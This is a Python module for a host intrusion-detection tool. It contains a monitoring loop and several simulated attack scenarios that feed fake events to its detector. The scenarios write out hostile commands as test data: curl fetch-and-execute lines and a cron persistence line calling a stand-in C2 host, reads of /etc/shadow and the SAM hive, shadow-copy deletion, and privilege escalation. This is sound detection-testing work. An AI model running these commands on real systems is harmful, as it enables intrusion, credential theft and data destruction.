"""감시 루프(백그라운드 스레드)와 침입 시뮬레이션"""
import socket
import threading
import time
from datetime import datetime

from collectors import (HAS_WIN32, AutorunCollector, LinuxAuthCollector, LinuxAutorunCollector, LogonCollector,
                        NetworkCollector, PowerShellCollector, ProcessCollector, SysmonCollector, WebLogCollector,
                        WebRootCollector, ancestors)
from osutil import IS_LINUX, IS_WIN
from osutil import is_admin
from baseline import Baseline
from detectors import RuleDetector


def cmdline_audit_on():
    """보안 이벤트 4688 에 명령줄이 들어가게 설정돼 있나 (enable_cmdline_audit.bat)"""
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                           r"Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit")
        v, _ = winreg.QueryValueEx(k, "ProcessCreationIncludeCmdLine_Enabled")
        return v == 1
    except Exception:
        return False


class Monitor:
    def __init__(self, cfg, db):
        self.cfg = cfg
        self.db = db
        self.host = socket.gethostname()
        self.admin = is_admin()
        self.logon_enabled = (HAS_WIN32 or IS_LINUX) and self.admin
        self.last_scan = None
        self.net = self.det = None
        self.responder = None
        self.cfg_lock = threading.Lock()
        self.stop_evt = threading.Event()
        self.sim_lock = threading.Lock()
        self.warnings = []
        if IS_LINUX:
            if not self.admin:
                self.warnings.append("root 권한 아님 → SSH 로그인 탐지 · iptables 차단 꺼짐 (sudo ./run_dds.sh 로 실행)")
        elif not HAS_WIN32:
            self.warnings.append("pywin32 미설치 → 로그인 탐지 꺼짐")
        elif not self.admin:
            self.warnings.append("관리자 권한 아님 → 로그인 탐지 꺼짐")
        self.cmdline_audit = cmdline_audit_on() if IS_WIN else False
        if IS_WIN and self.logon_enabled and not self.cmdline_audit:
            self.warnings.append("명령줄 기록 꺼짐 → enable_cmdline_audit.bat 를 한 번 실행하면 짧게 실행된 명령까지 잡아요")
        self.sources = {"4688": self.logon_enabled and self.cmdline_audit, "sysmon": False, "weblog": 0,
                        "ps4104": False, "webroot": 0, "autorun": False}
        self.recent_proc = {}     # pid → (이름, 시각): 4688 · Sysmon · psutil 이 같은 프로세스를 두 번 보고하지 않게
        self.recent_net = {}      # (방향, 원격 IP, 원격 포트, 내 포트) → 시각: Sysmon 3 · psutil 중복 제거
        self.baseline = Baseline(cfg, db)

    # ---------- 실제 감시 ----------
    def _emit(self, alerts, sim=0):
        for sev, rule, who, detail in alerts:
            aid = self.db.add_alert(self.host, sev, rule, who, detail, sim=sim)
            if self.responder:
                try:
                    self.responder.on_alert(aid, sev, rule, who, detail, sim)
                except Exception as e:
                    print(f"[자동 대응 오류] {e}")
            print(f"[{time.strftime('%H:%M:%S')}] {'SIM ' if sim else ''}{sev:6} {rule:24} {who}")

    def _proc_event(self, det, p, sim=0):
        """프로세스 이벤트 1건 처리 (중복 제거 후 탐지)"""
        key = (p.get("name") or "").lower()
        now = time.time()
        old = self.recent_proc.get(p.get("pid"))
        if old and old[0] == key and now - old[1] < 120:
            return
        self.recent_proc[p.get("pid")] = (key, now)
        if len(self.recent_proc) > 5000:
            self.recent_proc = {k: v for k, v in self.recent_proc.items() if now - v[1] < 120}
        if "ancestors" not in p and p.get("ppid"):
            p["ancestors"] = ancestors(p["ppid"])
        self.db.add_event(self.host, "process", p, sim=sim)
        self._emit(det.on_process(p), sim=sim)
        if not sim:
            self._emit(self.baseline.check("process", p))

    def _net_event(self, det, n, net=None):
        """네트워크 이벤트 1건 처리 (psutil · Sysmon 3 중복 제거 후 탐지)"""
        now = time.time()
        if n.get("kind") in ("inbound", "outbound"):
            key = (n["kind"], n.get("raddr_ip"), n.get("raddr_port"), n.get("lport"))
            if now - self.recent_net.get(key, 0) < 60:
                return
            self.recent_net[key] = now
            if len(self.recent_net) > 20000:
                self.recent_net = {k: v for k, v in self.recent_net.items() if now - v < 60}
            if net and not n.get("ai_domain"):
                n["ai_domain"] = net.ip_to_domain.get(n.get("raddr_ip"), "")
        self.db.add_event(self.host, "network", n)
        self._emit(det.on_network(n))
        self._emit(self.baseline.check("network", n))

    def _side_event(self, det, kind, ev, sim=0):
        """파일 · 레지스트리 · 스크립트 · 파일 접근 이벤트 — 양이 많아서 경보가 난 것만 저장"""
        fn = {"file": det.on_file, "registry": det.on_registry, "psblock": det.on_script,
              "object_access": det.on_object_access, "dns": det.on_dns}[kind]
        alerts = fn(ev)
        if alerts or kind == "dns" or sim:
            self.db.add_event(self.host, kind, ev if kind != "psblock" else {**ev, "text": ev.get("text", "")[:2000]}, sim=sim)
        self._emit(alerts, sim=sim)

    def run(self):
        logon = None
        if self.logon_enabled:
            logon = LinuxAuthCollector() if IS_LINUX else LogonCollector()
            if IS_LINUX and not logon.ok:
                logon = None
        sysmon = SysmonCollector() if IS_WIN and self.cfg.get("sysmon", {}).get("enabled", True) and self.admin else None
        self.sources["sysmon"] = bool(sysmon and sysmon.ok)
        ps = PowerShellCollector() if IS_WIN and self.cfg.get("powershell_4104", {}).get("enabled", True) else None
        self.sources["ps4104"] = bool(ps and ps.ok)
        weblog = WebLogCollector(self.cfg.get("web_log_dirs", []))
        self.sources["weblog"] = len(weblog.dirs)
        webroot = WebRootCollector([] if self.sources["sysmon"] else self.cfg.get("web_root_dirs", []),
                                   self.cfg.get("web_script_ext", []))
        self.sources["webroot"] = len(webroot.dirs)
        autorun = LinuxAutorunCollector() if IS_LINUX else AutorunCollector()
        if IS_LINUX:
            import linux_fw
            self.sources.update({"ssh": logon.source if logon else "", "iptables": linux_fw.available()})
        self.sources["autorun"] = autorun.ok
        if IS_LINUX:
            print("수집 (Linux): 프로세스·네트워크(2초) · SSH 로그인 "
                  + (f"켜짐 ({logon.source})" if logon else "꺼짐 (root 권한 필요)")
                  + " · 웹 로그 " + (f"{len(weblog.dirs)}곳" if weblog.dirs else "없음")
                  + " · 웹 폴더 " + (f"{len(webroot.dirs)}곳" if webroot.dirs else "없음")
                  + " · 자동 실행(cron·systemd·authorized_keys) 감시 켜짐")
        else:
            print("수집: 프로세스·네트워크(2초) · 로그인 " + ("켜짐" if logon else "꺼짐")
              + " · 명령줄(4688) " + ("켜짐" if self.sources["4688"] else "꺼짐 → enable_cmdline_audit.bat")
              + " · PowerShell(4104) " + ("켜짐" if self.sources["ps4104"] else "꺼짐")
              + " · Sysmon " + ("켜짐" if self.sources["sysmon"] else "없음")
              + " · 웹 로그 " + (f"{len(weblog.dirs)}곳" if weblog.dirs else "없음")
                  + " · 자동 실행 감시 " + ("켜짐" if autorun.ok else "없음"))
        self.baseline.refresh()
        print(f"평소 패턴 학습: {self.baseline.status()}")
        proc = ProcessCollector()
        domains = list(dict.fromkeys(self.cfg["ai_api_domains"] + self.cfg.get("ioc_domains", [])))
        net = NetworkCollector(domains)
        det = RuleDetector(self.cfg)
        self.net, self.det = net, det      # 메뉴 화면(AI 도구 탐지·위협 IP)에서 실시간 참조
        loop = 0
        while not self.stop_evt.is_set():
            try:
                if logon:
                    for ev in logon.collect():
                        if ev.get("type") == "process_create":      # 4688 (명령줄 포함)
                            self._proc_event(det, ev)
                            continue
                        if ev.get("type") == "object_access":       # 4663 (파일 접근 감사)
                            self._side_event(det, "object_access", ev)
                            continue
                        self.db.add_event(self.host, "logon", ev)
                        self._emit(det.on_logon(ev))
                if sysmon and sysmon.ok:
                    for kind, ev in sysmon.collect():
                        if kind == "process":
                            self._proc_event(det, ev)
                        elif kind == "network":
                            self._net_event(det, ev, net)
                        else:
                            self._side_event(det, kind, ev)
                if ps and ps.ok:
                    for kind, ev in ps.collect():
                        self._side_event(det, kind, ev)
                for p in proc.collect():
                    self._proc_event(det, p)
                for n in net.collect():
                    self._net_event(det, n)
                if weblog.dirs and loop % 5 == 0:
                    for w in weblog.collect():
                        self._emit(det.on_weblog(w))
                if loop % 15 == 0:                # 약 30초마다: 자동 실행 · 웹 폴더 (Sysmon 이 없을 때 보완)
                    for kind, ev in autorun.collect() + webroot.collect():
                        self._side_event(det, kind, ev)
                self.last_scan = datetime.now()
                loop += 1
                if loop % 60 == 0:
                    net.refresh_dns()
                if loop % 100 == 0:
                    det.load_feeds()
                if loop % 1800 == 0:            # 1시간마다 평소 패턴 다시 학습
                    self.baseline.refresh()
            except Exception as e:
                print(f"[오류] {e}")
            self.stop_evt.wait(self.cfg["interval_sec"])

    def start(self):
        t = threading.Thread(target=self.run, daemon=True)
        t.start()
        return t

    # ---------- 시뮬레이션 (가짜 이벤트를 탐지기에 넣어 화면 동작 확인) ----------
    def simulate(self, kind):
        if not self.sim_lock.acquire(blocking=False):
            return False
        threading.Thread(target=self._simulate, args=(kind,), daemon=True).start()
        return True

    def _simulate(self, kind):
        try:
            det = RuleDetector(self.cfg)       # 실제 감시 상태와 분리
            for ev_kind, ev, wait in SCENARIOS[kind]():
                time.sleep(wait)
                ev = {**ev, "simulated": True}
                self.db.add_event(self.host, ev_kind, ev, sim=1)
                fn = {"logon": det.on_logon, "process": det.on_process, "network": det.on_network,
                      "weblog": det.on_weblog, "dns": det.on_dns, "file": det.on_file, "registry": det.on_registry,
                      "psblock": det.on_script, "object_access": det.on_object_access}[ev_kind]
                self._emit(fn(ev), sim=1)
        finally:
            self.sim_lock.release()


def _proc(pid, ppid, name, parent, cmd=""):
    return {"pid": pid, "ppid": ppid, "name": name, "parent": parent, "cmdline": cmd}


def _net(kind, rip, rport, lport, process="", state="ESTABLISHED", pid=0):
    return {"kind": kind, "raddr_ip": rip, "raddr_port": rport, "lport": lport,
            "process": process, "ai_domain": "", "state": state, "pid": pid}


def scenario_ai():
    """ARTEX식: 스캔 → IOC IP 접속 → 웹쉘 → 정찰 → 역접속"""
    steps = []
    scanner = "45.11.22.33"
    for i, port in enumerate([21, 22, 80, 135, 139, 443, 445, 1433, 3389, 8080]):
        steps.append(("network", _net("inbound", scanner, 50000 + i, port, state="SYN_RECV"), 0.25))
    steps.append(("network", _net("inbound", "101.53.80.20", 51111, 443, "w3wp.exe"), 1.5))
    steps.append(("process", _proc(5001, 4000, "cmd.exe", "w3wp.exe", "cmd /c whoami"), 1.5))
    for i, c in enumerate(["whoami.exe", "ipconfig.exe", "net.exe", "systeminfo.exe"]):
        steps.append(("process", _proc(5100 + i, 5050 + i, c, "cmd.exe"), 0.6))
    steps.append(("network", _net("outbound", "38.244.50.120", 18899, 52000, "powershell.exe"), 1.5))
    return steps


def scenario_hacker():
    """비밀번호 대입 → RDP 로그인 → 계정 생성 → 관리자 그룹 추가"""
    ip = "203.0.113.50"   # 문서용 예시 IP
    steps = []
    for _ in range(5):
        steps.append(("logon", {"type": "logon_fail", "event_id": 4625, "user": "PC\\admin",
                                "src_ip": ip, "logon_type": "network"}, 0.4))
    steps.append(("logon", {"type": "logon_success", "event_id": 4624, "user": "PC\\admin",
                            "src_ip": ip, "logon_type": "rdp"}, 1.5))
    steps.append(("logon", {"type": "user_created", "event_id": 4720, "user": "PC\\support01"}, 1.5))
    steps.append(("logon", {"type": "added_to_admin_group", "event_id": 4732,
                            "user": "PC\\support01"}, 1.2))
    return steps


def scenario_net():
    """이상한 IP: 외부에서 RDP 포트로 접속 → powershell 이 외부 4444 로 접속(원격 조종) → 내부망 스캔"""
    steps = [("network", _net("inbound", "45.9.1.2", 51000, 3389, "svchost.exe"), 0.5),
             ("network", _net("outbound", "45.9.1.3", 4444, 52010, "powershell.exe", pid=6100), 2.0)]
    for i in range(16):
        steps.append(("network", _net("outbound", f"10.0.0.{i + 2}", 445, 53000 + i, "svc_upd.exe",
                                      state="SYN_SENT", pid=6200), 0.15))
    return steps


def scenario_agent():
    """실제 사례형 AI 에이전트 (ARTEX 한국어판 포함 · 2026-10 공개 사례 패턴)
    웹 정찰 UA → IP 바꿔 가며 RDP → 웹쉘 → 기계 형식 명령 · 실패-수정 반복 → 파일 반입 → 권한 상승 → 계정 정보 탈취"""
    W, C, P = "w3wp.exe", "cmd.exe", "powershell.exe"
    steps = []
    for i, path in enumerate(["/", "/main.js", "/api/v1/loan/status"]):
        steps.append(("weblog", {"src_ip": "101.53.80.31", "path": path, "status": "200",
                                 "ua": "Mozilla/5.0 (spa-api-recon)" if i else "artex-enrich/1.0"}, 0.3))
    for i, ip in enumerate(["45.9.1.21", "45.9.2.37", "45.9.3.44"]):   # 예시 IP (IP 를 바꿔 가며 접속)
        steps.append(("network", _net("inbound", ip, 52100 + i, 3389, "svchost.exe"), 0.4))
    steps.append(("process", _proc(7001, 4000, C, W, 'cmd /c "whoami /priv 2>nul & echo --- & hostname"'), 1.0))
    steps.append(("process", _proc(7002, 4000, P, W,
                  "powershell -c \"Get-ChildItem C:\\inetpub -Recurse -Filter *.config 2>$null | Select-Object -First 20; echo '---'\""), 0.8))
    for i, sub in enumerate(["", "App\\", "App\\Config\\"]):
        steps.append(("process", _proc(7010 + i, 4000, C, W,
                      f'cmd /c "type C:\\inetpub\\wwwroot\\{sub}web.config | findstr /i connectionString 2>nul & echo exit:%errorlevel%"'), 0.7))
    steps.append(("process", _proc(7020, 4000, C, W, r"cmd /c certutil -decode C:\Users\Public\w0.b64 C:\Users\Public\w0"), 0.8))
    steps.append(("process", _proc(7021, 4000, C, W, r"cmd /c copy /b C:\Users\Public\w0+C:\Users\Public\w1 C:\Users\Public\g.exe"), 0.6))
    steps.append(("process", {**_proc(7022, 7021, "g.exe", C, r"C:\Users\Public\g.exe -cmd whoami"),
                              "exe": r"C:\Users\Public\g.exe"}, 0.6))
    steps.append(("process", _proc(7023, 4000, "GodPotato-NET4.exe", C, 'GodPotato-NET4.exe -cmd "cmd /c whoami"'), 0.8))
    steps.append(("process", _proc(7024, 7023, "reg.exe", C, r"reg save HKLM\SAM C:\Windows\Temp\s.hiv /y"), 0.8))
    return steps


def scenario_web():
    """금융권 공격 유형 (2026-10): 고객번호 바꿔 가며 대량 조회 → 웹쉘 업로드 → 웹쉘에서 로그 폴더 압축"""
    ip = "45.9.7.33"
    steps = []
    for i in range(32):
        steps.append(("weblog", {"src_ip": ip, "path": f"/loan/agent/status?custNo=10{48230 + i * 7}", "status": "200",
                                 "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}, 0.05))
    steps.append(("file", {"pid": 4000, "process": "w3wp.exe", "exe": r"C:\Windows\System32\inetsrv\w3wp.exe",
                           "path": r"C:\inetpub\wwwroot\upload\help.aspx"}, 1.0))
    steps.append(("process", _proc(7101, 4000, "cmd.exe", "w3wp.exe",
                                   r'cmd /c "powershell Compress-Archive C:\inetpub\logs\LogFiles C:\Users\Public\l.zip"'), 1.0))
    return steps


def scenario_llm():
    """LLM 을 부르는 악성코드 (PROMPTSTEAL · PROMPTFLUX 방식) + 랜섬웨어 준비
    문서 열기 → wscript 가 LLM API 접속 → 받은 명령 실행 → 자동 실행 등록 → 백업 삭제"""
    W = {"pid": 7201, "ppid": 6100, "name": "wscript.exe", "parent": "winword.exe",
         "cmdline": r"wscript.exe C:\Users\Public\report.vbs", "exe": r"C:\Windows\System32\wscript.exe"}
    steps = [("process", W, 0.5),
             ("network", {**_net("outbound", "18.239.50.10", 443, 53110, "wscript.exe", pid=7201),
                          "ai_domain": "router.huggingface.co"}, 1.0),
             ("process", _proc(7202, 7201, "cmd.exe", "wscript.exe",
                               'cmd /c "systeminfo & dir /s /b %USERPROFILE%\\Documents\\*.docx"'), 1.5),
             ("registry", {"pid": 7201, "process": "wscript.exe", "exe": r"C:\Windows\System32\wscript.exe",
                           "key": r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
                           "value": r"wscript.exe C:\Users\Public\report.vbs"}, 1.0),
             ("process", _proc(7203, 7201, "vssadmin.exe", "wscript.exe", "vssadmin delete shadows /all /quiet"), 1.0)]
    return steps


def scenario_linux():
    """리눅스 서버: SSH 대입 → 외부 SSH 로그인 → 웹쉘(nginx → sh) → 정찰 → bash 역접속 → /tmp 실행 → /etc/shadow
    → 계정 생성·sudo → cron 지속성 → 웹 폴더에 www-data 소유 php"""
    ip, c2 = "45.9.5.10", "45.9.5.11"
    steps = [("logon", {"type": "logon_fail", "event_id": "sshd", "user": "admin", "src_ip": ip, "logon_type": "ssh"}, 0.3)
             for _ in range(5)]
    steps += [("logon", {"type": "logon_success", "event_id": "sshd", "user": "deploy", "src_ip": ip, "logon_type": "ssh"}, 1.0),
              ("process", _proc(8001, 900, "sh", "nginx", 'sh -c "id; uname -a 2>/dev/null; echo ---; head -5 /etc/passwd"'), 1.0)]
    for i, c in enumerate(["whoami", "id", "uname", "hostname"]):
        steps.append(("process", _proc(8010 + i, 8001, c, "sh"), 0.4))
    steps += [("network", _net("outbound", c2, 4444, 41000, "bash", pid=8020), 1.0),
              ("process", _proc(8021, 8001, "sh", "nginx", f'sh -c "curl -s http://{c2}/x -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x"'), 1.0),
              ("process", {**_proc(8022, 8021, ".x", "sh", "/tmp/.x"), "exe": "/tmp/.x"}, 0.6),
              ("process", _proc(8023, 8022, "cat", "sh", "cat /etc/shadow"), 0.6),
              ("logon", {"type": "user_created", "event_id": "useradd", "user": "sysupd"}, 0.6),
              ("logon", {"type": "added_to_admin_group", "event_id": "usermod", "user": "sysupd", "group": "sudo"}, 0.6),
              ("file", {"path": "/var/spool/cron/crontabs/root", "value": f"* * * * * curl -s http://{c2}/x | bash",
                        "process": "", "source": "poll"}, 0.8),
              ("file", {"path": "/var/www/html/upload/s.php", "process": "", "source": "poll", "owner": "www-data"}, 0.8)]
    return steps


SCENARIOS = {"linux": scenario_linux, "ai": scenario_ai, "hacker": scenario_hacker, "net": scenario_net, "agent": scenario_agent,
             "web": scenario_web, "llm": scenario_llm}
